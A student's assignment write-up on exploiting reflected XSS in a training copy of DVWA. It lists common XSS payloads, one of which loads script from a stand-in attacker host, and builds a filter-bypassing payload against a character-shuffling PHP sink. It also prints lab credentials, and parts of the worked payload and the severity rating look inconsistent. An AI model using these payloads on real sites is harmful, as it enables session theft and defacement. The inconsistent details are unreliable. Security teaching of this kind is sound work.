= Assignment: DVWA XSS <assignment-1>

== Overview and Definitions

This assignment focuses on a reflected XSS issue in DVWA. Here, XSS stands for Cross-Site Scripting and CVSS stands for Common Vulnerability Scoring System. The main reference I used for the assignment was _Bug Bounty Bootcamp_ by Vickie Li (No Starch Press, 2021), especially Chapter 6 on Cross-Site Scripting. Li defines XSS as _"An XSS vulnerability occurs when attackers can execute custom scripts on a victim's browser."_

DVWA (Damn Vulnerable Web Application) is a deliberately vulnerable training target available at #link("https://github.com/digininja/DVWA"). Based on the project documentation, it follows a typical LAMP stack setup. The repository also references a walkthrough video: #link("https://youtu.be/V4MATqtdxss?si=EMHoRvfZz_vI-v14")[Finding and exploiting reflected XSS in DVWA]. I also have it installed in my KVM/QEMU, since I followed a course where Metasploitable 2 is installed as a VM. For this course exercise, however, the relevant is expected to be available around the assignment brief. Also, University might've tampered with the DVWA, and thus, online tutorials wouldn't help.

Li presents several common XSS payloads, reproduced below as the starting point for the testing process.

#figure(
  table(
    columns: (auto, auto),
    stroke: 0.6pt + rgb("#D1D5DB"),
    inset: 7pt,
    fill: (_, y) => if y == 0 { rgb("#d6e0f5") },
    table.header(
      [*Payload*], [*Description*],
    ),
    [`<script>alert(1)</script>`], [Most generic XSS payload],
    [`<iframe src=javascript:alert(1)>`], [Useful when script tags are filtered but iframes are not],
    [`<body onload=alert(1)>`], [Another way to go around the script tag filter],
    [`"><img src=x onerror=prompt(1);>`], [Closes previous tag and inject the code as image error handler],
    [`<script>alert(1)<!–`], [Bypass filters that look for closing script tags],
    [`<a onmouseover"alert(1)">test</a>`], [Trigger XSS on mouseover event],
    [`<script src=//attacker.com/test.js>`], [Run code hosted on attacker's server],
  ),
  caption: [Common XSS payloads],
) <xss-payloads>

According to Li, a good XSS escape test string would be `>'<"//:=;!--`. Also, a lot of suitable payloads can be found from the OWASP XSS Filter Evasion Cheat Sheet: #link("https://owasp.org/www-community/xss-filter-evasion-cheatsheet")[OWASP XSS Filter Evasion Cheat Sheet].

== Target Setup and Relevant Code

The provided information of the DVWA server is:

```
Student: jksouran
Exercise: DVWA - Running
DVWA HTTP PORT: 2789
IP: 193.167.189.112
MCIR HTTP PORT: 2505
PASSWORD: jksouran81169
SSH PORT: 2895
```

The login to DVWA was successful with `admin:jksouran81169`. As part of the exercise, the PHP source code was known in advance. The important point is that user input is reflected back to the page without proper output encoding. Before reflection, the application randomizes a set of dangerous characters, which means the exercise is not solved by typing a standard payload directly.

```php
<?php
// Randomized implementation of xss_r/source/low.php

// header ("X-XSS-Protection: 0");
// Snipped out: response-header handling not needed for explaining the sink.

$tr_chars = "\"'\/<>()[]{}!`^~;:?+$";
$tr_random = "~+~}+{]\")`/<;[>!?(\\$^':~";
// srand(...), str_split(...), shuffle(...), and implode(...) snipped out.

$namestr = strtr($_GET['name'], $tr_chars, $tr_random);
echo '<pre>Hello ' . $namestr . '</pre>';
// Snipped out: surrounding input-check boilerplate.

?>
```

== Observations

To recover the randomized mapping, I submitted the `tr_chars` string itself into the input field. Comparing the original characters with the reflected output reveals which input characters must be used to reconstruct a working payload.

```
"\"'\/<>()[]{}!`^~;:?+$"
        | ||  |  |        <- Interesting ones highlighted
~+~}+{]")`/<;[>!?(\$^':~
```

== Assignment Solution

Once the mapping was known, the remaining task was straightforward: replace each dangerous character in a standard XSS payload with the corresponding input character that the server would later shuffle back into the intended output.

```
orig: <script>alert(i)</script>
fixd: ]script!alert~1(][script!
```

When the transformed payload was submitted, the application reconstructed a valid `<script>alert(1)</script>` sequence in the reflected response and the JavaScript executed in the browser. This confirms that the target is vulnerable to reflected XSS despite the randomized character substitution.

#figure(
  image("images/01-xss-success.png", width: 50%),
  caption: [
    The JavaScript alert succesfully run.
  ],
)

In its current state, this is not an ultra critical security flaw, since the string is simply shown to the user who wrote it. It this was a bulletin board, allowing anyone to write code would mean that other site users would end up running the code on their browser. This would make it from Reflected XSS into a Stored XSS. However, I believe that the code can be used to fetch variable values, thus potentially exposing sensitive information. Thus, I would rate this vulnerability as *CRITICAL*.